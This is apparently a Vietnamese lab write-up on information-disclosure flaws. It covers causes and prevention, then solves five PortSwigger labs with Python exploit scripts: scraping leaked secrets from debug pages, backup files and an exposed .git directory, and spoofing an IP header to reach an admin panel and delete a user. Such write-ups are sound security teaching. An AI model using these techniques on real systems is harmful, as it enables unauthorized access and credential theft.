# Information Disclosure

## Khái niệm & Nguyên nhận & Phòng tránh

### Khái niệm

- Tiết lộ thông tin đề cập đến quá trình thông tin, đặc biệt là dữ liệu nhạy cảm hoặc bí mật, được tiết lộ hoặc cung cấp cho các cá nhân, tổ chức hoặc thực thể không có ý định truy cập vào thông tin đó
- Hậu quả của việc tiết lộ thông tin có thể sâu rộng, ảnh hưởng đến quyền riêng tư của cá nhân, khả năng cạnh tranh của doanh nghiệp và thậm chí cả an ninh quốc gia. Các thông tin nhạy cảm tiết lộ thường sẽ tạo tiền đề để kẻ tấn công có thể thực hiện tấn công bằng những lỗ hổng khác. Chẳng hạn, một số thông tin nhạy cảm tiết lộ từ thông báo lỗi có thể là dấu hiệu cho những lổ hổng như SQL Injection, Server-side Template Injection, ... Đối với một phần mã nguồn bị lộ giúp kẻ tấn công có thể tìm kiếm các cách khai thác trực tiếp trong source code, hoặc xây dựng một cuộc tấn công Deserialize, ... Những phiên bản hệ điều hành, phiên bản công nghệ bị lộ có thể giúp kẻ tấn công tìm kiếm một số CVE (Common Vulnerabilities and Exposures) áp dụng với chính phiên bản đó.
- **Web Crawler** hay còn được gọi là Web Spider có thể hiểu một con bot/công cụ được thiết kế với mục đích tìm kiếm, thu thập thông tin và lập chỉ mục cho toàn bộ nội dung trong các trang web trên mạng internet.
- Web crawler có chức năng lấy thông tin từ website , trích xuất ra những thông tin người sử dụng cần, đồng thời cũng tìm những link có trong trang web đó và tự động truy cập vào những link đó

![image](https://hackmd.io/_uploads/B1acqJ-h6.png)

- Web Crawler, còn được gọi là Web Spider, là một bot được thiết kế để tự động tìm kiếm và thu thập thông tin từ các trang web trên internet, đồng thời xây dựng chỉ mục cho dữ liệu này. Web Crawler giúp các công cụ tìm kiếm đạt được độ chính xác cao nhất khi đánh giá dữ liệu trên trang web và có thể truy xuất nội dung khi có yêu cầu.
- Các công cụ tìm kiếm sử dụng Web Crawler để thu thập dữ liệu và áp dụng các thuật toán tìm kiếm để cung cấp các kết quả liên quan khi người dùng tìm kiếm. Sau khi người dùng nhập từ khóa, một danh sách các trang web sẽ được hiển thị.

![image](https://hackmd.io/_uploads/By23A1-hp.png)

- Đây là một công cụ khá quan trọng trong việc tối ưu trang web, giúp trang web trở nên thân thiện hơn với bộ máy tìm kiếm và giúp website tiếp cận được lượng lớn người dùng truy cập

![image](https://hackmd.io/_uploads/rkAysJZ2p.png)

![image](https://hackmd.io/_uploads/BJWOjkZna.png)

- Chúng có khả năng hỗ trợ các công cụ tìm kiếm tìm ra những đánh giá chính xác nhất về dữ liệu của trang web, đồng thời truy xuất nội dung ngay khi có yêu cầu.

- Do đó, bằng cách áp dụng các thuật toán tìm kiếm khác nhau cho những dữ liệu được thu thập bởi Web Crawler, các công cụ tìm kiếm có thể cung cấp liên kết đáp ứng yêu cầu truy vấn của người dùng (Sau khi người dùng nhập từ khoá, một danh sách website liên quan sẽ được hiển thị).

- Để hiểu rõ hơn về web crawler, bạn có thể tìm hiểu cụ thể hơn về cách thức hoạt động của công cụ này như sau:

  - Hoạt động của Web Crawler bao gồm việc khám phá các URL, kiểm tra và phân loại các trang web. Sau đó, nó sẽ thêm các liên kết trên một trang web vào danh sách web cần thu thập thông tin. Sự thông minh của Web Crawler giúp xác định tầm quan trọng của từng trang web.
  - Bot công cụ tìm kiếm Web Crawler không thể thu thập toàn bộ thông tin trên internet, nhưng nó dựa vào các yếu tố như lượt xem, số lượng liên kết và uy tín thương hiệu để quyết định giá trị của mỗi trang web. Điều này cho phép Web Crawler xác định những trang web nào cần thu thập thông tin, cũng như thực hiện việc thu thập theo trình tự và tần suất phù hợp.
  - Khi Web Crawler đang truy cập vào trang web của bạn, nó sẽ kiểm tra các thẻ meta và nội dung, lưu trữ thông tin đã kiểm tra và tạo chỉ mục để Google sắp xếp từ khóa. Ngoài ra, Web Crawler cũng xem xét tệp robot.txt của trang web trước khi bắt đầu quá trình để xác định trang web cần thu thập thông tin.
  - Khi Web Crawler đã thu thập thông tin và nội dung từ trang web, nó sẽ quyết định xem liệu trang web của bạn có được hiển thị trên trang kết quả tìm kiếm khi có truy vấn hay không.

Tệp tin sitemap.xml chứa các đường link liên kết có nhiệm vụ trích dẫn đến trang website chính. Trong đó, trang web con phải đảm bảo tính rõ ràng, mạch lạc của chúng. Tệp tin này có chức năng chính là định hướng và giúp những bộ máy tìm kiếm đến địa chỉ website, từ đó giúp việc thu thập thông tin nhanh chóng và dễ dàng hơn. Bởi vậy, nó cũng có thể chứa một số đường dẫn nhạy cảm. Chúng ta có thể truy cập tệp tin này bằng cách thêm /sitemap.xml vào sau URL.

![image](https://hackmd.io/_uploads/B1oA-gWha.png)

### Nguyên nhân

- Thông báo lỗi tiết lộ dữ liệu nhạy cảm

  - Rò rỉ thông tin có thể xảy ra khi thông báo lỗi cung cấp quá nhiều chi tiết. Những kẻ tấn công có thể khai thác những thông báo này để hiểu rõ hơn về cấu trúc của ứng dụng hoặc để truy cập dữ liệu nhạy cảm.
  - Ví dụ: Hãy tưởng tượng một người dùng đang cố gắng truy cập vào cổng ngân hàng trực tuyến. Thay vì thông báo lỗi chung sau lần đăng nhập không thành công, trang web hiển thị: “Lỗi: Không thể kết nối với cơ sở dữ liệu SQL tại db.bankserver.com bằng thông tin xác thực quản trị viên:securePass!@#.” Thông báo này không chỉ tiết lộ tên máy chủ nội bộ mà còn tiết lộ tổ hợp tên người dùng và mật khẩu tiềm năng cho cơ sở dữ liệu.

- Danh sách thư mục

  - Cấu hình không đầy đủ có thể dẫn đến việc bất kỳ ai cũng có thể truy cập được danh sách thư mục. Điều này làm lộ cấu trúc tệp nội bộ của ứng dụng web, giúp kẻ tấn công xác định các mục tiêu tiềm năng dễ dàng hơn.
  - Ví dụ: Trong khi khám phá một diễn đàn trực tuyến mới, người dùng nhận thấy rằng chỉ cần xóa các phần của URL, họ có thể xem cấu trúc thư mục. Ví dụ: điều hướng đến “ `www.forumexample.com/files/` " hiển thị danh sách tất cả các tệp và thư mục, bao gồm “admin_configs” và “user_passwords”. Điều này cho thấy rằng danh sách thư mục của máy chủ web đã được bật và không có kiểm soát truy cập nào trên các thư mục quan trọng.

- API được bảo mật không đúng cách

  - API thường xử lý dữ liệu nhạy cảm. Khi API thiếu các biện pháp kiểm soát xác thực và ủy quyền thích hợp, kẻ tấn công có thể chặn và thao túng việc truyền dữ liệu.

- Tệp cấu hình không an toàn

  - Các tệp cấu hình chứa thông tin xác thực hoặc thông tin nhạy cảm khác phải được giữ an toàn. Tuy nhiên, nếu chúng không được bảo vệ đầy đủ, kẻ tấn công có thể truy cập và khai thác thông tin này.

- Xử lý lỗi dài dòng

  - Các thông báo lỗi dài dòng có thể vô tình cung cấp cho kẻ tấn công những hiểu biết sâu sắc về hoạt động bên trong của ứng dụng, có khả năng hỗ trợ chúng thực hiện các cuộc tấn công có chủ đích.

- Trường biểu mẫu ẩn:
  - Ví dụ: Trên cổng thông tin của trường đại học, một sinh viên đang cập nhật hồ sơ của mình. Trong khi kiểm tra nguồn trang để khắc phục sự cố hiển thị, họ nhận thấy một trường ẩn: `<input type="hidden" name="grade_access" value="student">`. Sự tò mò khiến họ thay đổi giá trị từ "sinh viên" thành "quản trị viên" và khi gửi biểu mẫu, họ đột nhiên có quyền truy cập vào các chức năng sửa đổi điểm, tiết lộ sự giám sát nghiêm trọng trong thiết kế của biểu mẫu.
- Không xóa được nội dung nội bộ khỏi nội dung công khai . Ví dụ: nhận xét của nhà phát triển trong đánh dấu đôi khi được hiển thị cho người dùng trong môi trường sản xuất.
- Mã nguồn trang: Bằng cách nhấp chuột phải vào trang web và chọn “Xem nguồn trang”, người ta có thể tìm thấy các nhận xét do nhà phát triển để lại có chứa thông tin nhạy cảm hoặc URL tới các thư mục ẩn.

### Phòng tránh

- Trước hết, các nhà phát triển ứng dụng cần phân biệt được các thông tin thông thường và thông tin nhạy cảmChú ý thiết lập quyền truy cập nghiêm ngặt đối với vai trò của mỗi người dùng.
- Không để lộ các file backup, đường dẫn nhạy cảm.
- Sử dụng thông báo lỗi chung chung càng nhiều càng tốt. Đừng cung cấp cho kẻ tấn công manh mối về hành vi ứng dụng một cách không cần thiết.
- Đảm bảo bạn hiểu đầy đủ các cài đặt cấu hình và ý nghĩa bảo mật của bất kỳ công nghệ bên thứ ba nào mà bạn triển khai. Dành thời gian để điều tra và tắt mọi tính năng và cài đặt mà bạn không thực sự cần.
- Lập trình viên cần xử lý tốt các trường hợp ngoại lệ có thể xảy ra.
- Luôn sử dụng và cập nhật các công nghệ áp dụng lên phiên bản mới nhất.

![image](https://hackmd.io/_uploads/ry0NHq-3T.png)

## 1. Lab: Information disclosure in error messages

link: https://portswigger.net/web-security/information-disclosure/exploiting/lab-infoleak-in-error-messages

### Đề bài

![image](https://hackmd.io/_uploads/rJgmMe-hp.png)

### Phân tích

- Các dòng thông báo lỗi từ trang web này cho chúng ta biết một số thông tin về framework trang web sử dụng. Chúng ta cần tìm ra mã phiên bản của framework này.
- Từ giao diện chúng ta thấy đây là một trang web bán hàng, mỗi sản phẩm có mục tùy chọn View detail có thể xem thông tin chi tiết sản phẩm.

- Khi chọn View detail của sản phẩm bất kì, chúng ta được chuyển tới thư mục /product.
- chúng ta thấy trên URL sản phẩm được đánh dấu khác nhau dựa vào product ID.

![image](https://hackmd.io/_uploads/S1LzQxWna.png)

- Từ đây có thể dự đoán tham số productId tương ứng với mỗi dòng sản phẩm mang giá trị là số nguyên dương như 1, 2, 3, ... Có thể thay giá trị này thành 2, 3, ... sẽ thấy sản phẩm hiển thị thay đổi

### Khai thác

- nhận ra tất cả các sản phẩm này được đánh dấu theo id là số bắt đầu từ 1, mình đã thử xem nếu mình nhập vào id là 1 chuỗi thì nó sẽ xử lý như nào

![image](https://hackmd.io/_uploads/H132Qeb2T.png)

Server đã báo lỗi ngay lập tức, với status 500 đồng thời lộ ra framework là : `Apache Struts 2 2.3.31`

Submit phiên bản để hoàn thành thử thách:

![image](https://hackmd.io/_uploads/HJr44g-hp.png)

mình đã viết lại script khai thác

```python
#!/usr/bin/python3.7
import requests
import re
from bs4 import BeautifulSoup
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
from urllib.parse import quote

url = 'https://0a7300c003d3ddcc824e6b4d00780026.web-security-academy.net'

session=requests.Session()
response = session.get(
    url +'/product?productId="abc"',
    verify=False,
)

pattern = r"Apache Struts \d\ \d\.\d\.\d+"
match = re.search(pattern, response.text)

data = {
    'answer': match
}

response= session.post(
    url + '/submitSolution',
    data=data,
    verify=False,
)

print(response.text)
```

![image](https://hackmd.io/_uploads/BkKMHe-n6.png)

mục đích của chúng ta đã hoàn thành và mình đã solve được lab này

![image](https://hackmd.io/_uploads/r10rHgb2a.png)

## 2. Lab: Information disclosure on debug pag

link: https://portswigger.net/web-security/information-disclosure/exploiting/lab-infoleak-on-debug-page

### Đề bài

![image](https://hackmd.io/_uploads/BJbKwOZ3p.png)

### Phân tích

- Trang web chứa một trang debug tiết lộ một số thông tin quan trọng. Chúng ta cần tìm kiếm giá trị biến môi trường SECRET_KEY.

### Khai thác

- CTRL +U mình quan sát source code trang web tại trang chủ nhận thấy 1 đường dẫn đã được comment

![image](https://hackmd.io/_uploads/Hk04uu-2a.png)

`/cgi-bin/phpinfo.php`

truy cập vào và mình đến được file phpinfo.php

![image](https://hackmd.io/_uploads/HyQ_OOZnp.png)

trong đây chứa nội dung SECRET_KEY mà mình cần tìm là **qpgt33xy2xvdqhi62wnwftt5jboaz95o **

![image](https://hackmd.io/_uploads/Sktj__W2a.png)

đem submit và mình solve được lab

![image](https://hackmd.io/_uploads/BJu1K_W2p.png)

- Trong tình huống trên, kể cả trường hợp lập trình viên không comment đoạn code chứa đường dẫn tới /cgi-bin/phpinfo.php mà xóa hoàn toàn dòng code ấy đi. Thì chúng ta vẫn có thể biết tới đường dẫn này qua một số tool quét thư mục như Dirsearch, Gobuster hoặc tính năng Discover content của Burp Suite.

mình đã viết script khai thác

```python
#!/usr/bin/python3.7
import requests
import re
from bs4 import BeautifulSoup
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
from urllib.parse import quote

url = 'https://0ab800da04e772ae88c448f9001e005b.web-security-academy.net'

session=requests.Session()


response = session.get(
    url +'/cgi-bin/phpinfo.php',
    verify=False,
)

pattern = r'<td class="v">\w{32}\b'
match = re.search(pattern, response.text)
data_string = match.group()
data_answer = data_string.split('>')[1]

data = {
    'answer': data_answer,
}

response= session.post(
    url + '/submitSolution',
    data=data,
    verify=False,
)

print(response.text)
```

![image](https://hackmd.io/_uploads/HJvEnO-hp.png)

mục đích của chúng ta đã hoàn thành và mình đã solve được lab này

![image](https://hackmd.io/_uploads/SJdO3O-hp.png)

## 3. Lab: Source code disclosure via backup files

link: https://portswigger.net/web-security/information-disclosure/exploiting/lab-infoleak-via-backup-files

### Đề bài

![image](https://hackmd.io/_uploads/S113aObn6.png)

### Phân tích

- Trang web bị lộ file backup trong một thư mục ẩn, chúng ta cần tìm kiếm database password chứa trong file backup đó.

### Khai thác

- dùng dirsearch mình quét được file robots.txt

![image](https://hackmd.io/_uploads/Hk0gLt-hp.png)

- Truy cập tới thư mục `/robots.txt` phát hiện đường dẫn chứa file backup:

![image](https://hackmd.io/_uploads/HyDVgKZhT.png)

![image](https://hackmd.io/_uploads/SkiUeKb3T.png)

Click vào file `ProductTemplate.java.bak` thu được database password:

![image](https://hackmd.io/_uploads/H1ukWt-hT.png)

đem submit và mình solve được lab

mình đã viết script khai thác

```python
#!/usr/bin/python3.7
import requests
import re
from bs4 import BeautifulSoup
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
from urllib.parse import quote

url = 'https://0a1d00e70355effb82fc10ee00600034.web-security-academy.net'

session=requests.Session()

response = session.get(
    url +'/backup/ProductTemplate.java.bak',
    verify=False,
)

pattern = r'\b\w{32}\b'
match = re.search(pattern, response.text)
data_string = match.group()

data = {
    'answer': data_string,
}

response= session.post(
    url + '/submitSolution',
    data=data,
    verify=False,
)

print(response.text)
```

![image](https://hackmd.io/_uploads/HJb6-t-np.png)

mục đích của chúng ta đã hoàn thành và mình đã solve được lab này

![image](https://hackmd.io/_uploads/B1eyMK-3p.png)

## 4. Lab: Authentication bypass via information disclosure

link: https://portswigger.net/web-security/information-disclosure/exploiting/lab-infoleak-authentication-bypass

### Đề bài

![image](https://hackmd.io/_uploads/rJHbQtbhp.png)

### Phân tích

- Giao diện administrator của trang web chứa lỗ hỏng xác thực và có thể khai thác bằng các lỗ hổng qua phương thức HTTP. Chúng ta cần truy cập vào trang admin panel từ đó xóa tài khoản người dùng carlos. Chúng ta được cung cấp một tài khoản hợp lệ wiener:peter cho mục đích kiểm thử.

- tiếp tục dùng dirseach mình có được trang /admin

![image](https://hackmd.io/_uploads/rJlc8Fb26.png)

kết quả rằng chỉ có địa chỉ mạng local mới có thể vào được admin interface

![image](https://hackmd.io/_uploads/r10CUY-3p.png)

Status code trả về là 401 Unauthorized

- trang web không cho phép dùng method option
  ![image](https://hackmd.io/_uploads/HkP_VFW2p.png)

- mình thử dùng trace và thành công
  ![image](https://hackmd.io/_uploads/BkHarF-36.png)

![image](https://hackmd.io/_uploads/B11Nwtbnp.png)

- Đây là header xác định IP người dùng. Bởi vậy, để trở thành local user, có thể sử dụng header này với IP 127.0.0.1 giả mạo local user.

![image](https://hackmd.io/_uploads/S1h9vYbnT.png)

- Ứng dụng web của lab này cho phép user thực hiện được TRACE method ở tất cả các request. Khi đó, user có thể đọc được request thực sự mà server nhận được → Điều này dẫn đến có thể để lộ một số trường header nhạy cảm. Cụ thể ở đây là X-Custom-IP-Authorization. Đây là header có chức năng xác định IP nguồn của request để từ đó authorize theo. Như vậy, nếu X-Custom-IP-Authorization: 127.0.0.1 thì chứng tỏ request được gửi từ localhost và có thể được authorize làm admin.

### Khai thác

- khi thêm X-Custom-IP-Authorization: 127.0.0.1, ta đã vào được và có đủ chức năng của admin.

![image](https://hackmd.io/_uploads/B1zBdtbh6.png)

Thực hiện xóa user carlos và mình solve đươc lab

mình đã viết script khai thác

```python
#!/usr/bin/python3.7
import requests
import re
from bs4 import BeautifulSoup
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
from urllib.parse import quote

url = 'https://0a7f009203b1d05e8631e040006b0010.web-security-academy.net'

session=requests.Session()

headers = {
    'X-Custom-Ip-Authorization': '127.0.0.1',
}

response = session.get(
    url +'/admin/delete?username=carlos',
    headers=headers,
    verify=False,
)


soup = BeautifulSoup(response.text,'html.parser')
print(soup)
```

![image](https://hackmd.io/_uploads/rJbTtFWhT.png)

mục đích của chúng ta đã hoàn thành và mình đã solve được lab này

![image](https://hackmd.io/_uploads/HJ3l9Kb3a.png)

## 5. Lab: Information disclosure in version control history

link: https://portswigger.net/web-security/information-disclosure/exploiting/lab-infoleak-in-version-control-history

### Phân tích

- Trang web tiết lộ một số thông tin nhạy cảm qua các công nghệ kiểm soát phiên bản lịch sử mã nguồn. Chúng ta cần khai thác, tìm kiếm mật khẩu người dùng administrator, từ đó xóa tài khoản người dùng carlos.
- tiệp tục dùng dirsearch và mình quét được thư mục .git
- Đối với bài lab này, thư mục /.git bị public → các thông tin log về các commit sẽ bị lộ.

![image](https://hackmd.io/_uploads/rkAroFZhT.png)

### Khai thác

- Ở đây, mình sử dụng hệ điều hành Linux để khai thác lỗ hổng này. Sử dụng lệnh wget -r https://example-website/.git để crawl toàn bộ dữ liệu về

![image](https://hackmd.io/_uploads/rykHhtZ2p.png)

Sử dụng câu lệnh git log ta xem được các commit mà các developers đã thực hiện. `git log --oneline`

![image](https://hackmd.io/_uploads/B1vWTKb2T.png)

chúng ta thấy có admin panel và sau đấy có xóa admin passwd

- mình checkout về thời điểm Add skeleton admin panel

![image](https://hackmd.io/_uploads/S1fq6KZhp.png)

thấy có file admin.conf

![image](https://hackmd.io/_uploads/HJwn0Ybh6.png)

và mình vào đọc được mật khẩu của admin là **wli2f2dwpjhhp5x7k4hl**

![image](https://hackmd.io/_uploads/H13M79W36.png)

![image](https://hackmd.io/_uploads/SkDC0K-3p.png)

Đăng nhập với tài khoản `administrator:wli2f2dwpjhhp5x7k4hl` và xóa người dùng calos

![image](https://hackmd.io/_uploads/rk9Nkc-ha.png)

mình đã viết script khai thác

```python
#!/usr/bin/python3.7
import requests
import re
from bs4 import BeautifulSoup
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
from urllib.parse import quote

url = 'https://0a7e009004fa9699800121fe005500db.web-security-academy.net'

session=requests.Session()

response = session.get(
    url +'/login',
    verify=False,
)

soup = BeautifulSoup(response.text, 'html.parser')
csrf = soup.find('input', {'name': 'csrf'})['value']
session_data = response.headers['Set-Cookie'].split(';')[0].split('=')[1]

cookies = {
    'session': session_data,
}

ADMIN_PASSWORD = 'wli2f2dwpjhhp5x7k4hl'

data = {
    'csrf': csrf,
    'username': 'administrator',
    'password': ADMIN_PASSWORD,
}

response = session.post(
    url+'/login',
    cookies=cookies,
    data=data,
    verify=False,
    allow_redirects=False
)

session_data = response.headers['Set-Cookie'].split(';')[0].split('=')[1]
cookies = {
    'session': session_data,
}

response = session.get(
    url +'/admin/delete?username=carlos',
    cookies=cookies,
    verify=False,
)

soup = BeautifulSoup(response.text,'html.parser')
print(soup)
```

![image](https://hackmd.io/_uploads/B1oczcW2p.png)

mục đích của chúng ta đã hoàn thành và mình đã solve được lab này

![image](https://hackmd.io/_uploads/HJDdQqWhp.png)

<img  src="https://3198551054-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FVvHHLY2mrxd5y4e2vVYL%2Fuploads%2FF8DJirSFlv1Un7WBmtvu%2Fcomplete.gif?alt=media&token=045fd197-4004-49f4-a8ed-ee28e197008f">
